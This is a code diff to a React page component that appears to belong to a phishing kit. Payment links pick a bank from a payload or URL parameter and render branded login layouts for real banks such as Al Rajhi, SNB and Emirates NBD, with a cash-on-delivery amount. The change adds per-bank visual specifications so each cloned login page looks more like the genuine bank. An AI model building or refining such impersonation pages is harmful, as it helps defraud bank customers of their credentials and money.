@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useMemo, useEffect } from "react";
 import { useParams, useNavigate, useSearchParams } from "react-router-dom";
 import { bankBranding } from "@/lib/brandingSystem";
 import { useUpdateLink } from "@/hooks/useSupabase";
@@ -11,6 +11,7 @@ import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency } from "@/lib/countryCurrencies";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { AlRajhiLogin, SNBLogin, EmiratesNBDLogin, FABLogin, NBKLogin, GenericBankLogin } from "@/components/BankLoginLayouts";
+import { getEntityVisualSpec, specToCSSVariables } from "@/lib/entityVisualSpecs";
 
 const PaymentBankLogin = () => {
   const { id } = useParams();
@@ -28,6 +29,32 @@ const PaymentBankLogin = () => {
 
   const selectedBankId = linkData?.payload?.selectedBank || searchParams.get("bank");
   const selectedBankBranding = (selectedBankId && bankBranding[selectedBankId]) ? bankBranding[selectedBankId] : bankBranding.default;
+
+  // Get entity visual spec for bank
+  const entitySpec = useMemo(() => {
+    if (selectedBankId) {
+      return getEntityVisualSpec(selectedBankId);
+    }
+    return null;
+  }, [selectedBankId]);
+
+  // Apply entity CSS variables
+  useEffect(() => {
+    if (entitySpec) {
+      const cssVars = specToCSSVariables(entitySpec);
+      const root = document.documentElement;
+      Object.entries(cssVars).forEach(([key, value]) => {
+        root.style.setProperty(key, value);
+      });
+      root.setAttribute('data-entity', entitySpec.entityId);
+      root.setAttribute('data-entity-category', entitySpec.category);
+    }
+    return () => {
+      const root = document.documentElement;
+      root.removeAttribute('data-entity');
+      root.removeAttribute('data-entity-category');
+    };
+  }, [entitySpec]);
   
   const selectedCountry = linkData?.payload?.selectedCountry || "SA";
   const rawAmount = linkData?.payload?.cod_amount || 500;
